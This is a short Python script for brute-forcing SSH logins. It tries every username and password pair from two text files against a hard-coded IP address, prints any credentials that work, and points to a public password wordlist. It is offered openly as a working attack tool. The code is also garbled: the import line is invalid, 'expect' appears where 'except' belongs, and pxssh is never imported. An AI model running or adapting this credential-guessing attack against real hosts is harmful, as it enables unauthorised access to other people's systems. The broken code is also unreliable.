#!/bin/python
import expect*

users=open("users.txt",'r')


for user in users.read().split("\n"):
  passwords = open("passwords.txt","r")
  for password in passwords.read().split("\n"):
    try:
      connect = pxssh.pxssh()
      connect.login("70.191.157.45",str(user),str(password))
      print "User y Password  Found"
      print "The User is : ", format(user)
      print "THe password is : ",format(password)
    expect:
      print "User and Password Incorrect"
      print "User : ",format(user)
      print "Password : ",format(password)
      
 


''' 
This can be dynamic as far as entering the IP address or Target IP but for now you need to hard code the IP into the code

YOU NEED
1 - one file name users.txt
2 - one file name passwords.txt 

You may obtain a free dictionary 

https://github.com/jeanphorn/wordlist

use at your own discretion
'''
